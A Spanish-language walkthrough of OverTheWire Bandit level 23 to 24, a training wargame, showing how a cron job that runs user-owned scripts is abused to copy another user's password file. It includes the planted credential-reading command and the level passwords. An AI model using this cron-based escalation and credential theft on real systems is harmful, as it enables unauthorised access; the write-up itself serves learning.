

# Level 23 -> 24

# Descripcion

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# Datos de Acceso

Bandit23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

# Solución

```bash
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/sorryIHackedYou
bandit23@bandit:~$ cd /tmp/sorryIHackedYou
bandit23@bandit:/tmp/sorryIHackedYou$ nano acvscript.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/sorryIHackedYou$ cat acvscript.sh
cat /etc/bandit_pass/bandit24 > /tmp/sorryIHackedYou/password
bandit23@bandit:/tmp/sorryIHackedYou$ chmod 777 acvscript.sh
bandit23@bandit:/tmp/sorryIHackedYou$ touch password
bandit23@bandit:/tmp/sorryIHackedYou$ chmod 666 password
bandit23@bandit:/tmp/sorryIHackedYou$ ls -la
total 112
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 18:33 .
drwxrwx-wt 3010 root     root     106496 Feb 28 18:33 ..
-rwxrwxrwx    1 bandit23 bandit23     62 Feb 28 18:32 acvscript.sh
-rw-rw-rw-    1 bandit23 bandit23      0 Feb 28 18:33 password
bandit23@bandit:/tmp/sorryIHackedYou$ cp acvscript.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/sorryIHackedYou$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```

# Comentarios

|cmd| desc|
|-----|--------|
|mkdir| crear un directorio|
|cp| copiar un archivo|
|chmod| otorgar permisos personalizados a los archivos|
|touch| creamos un archivo vacio|

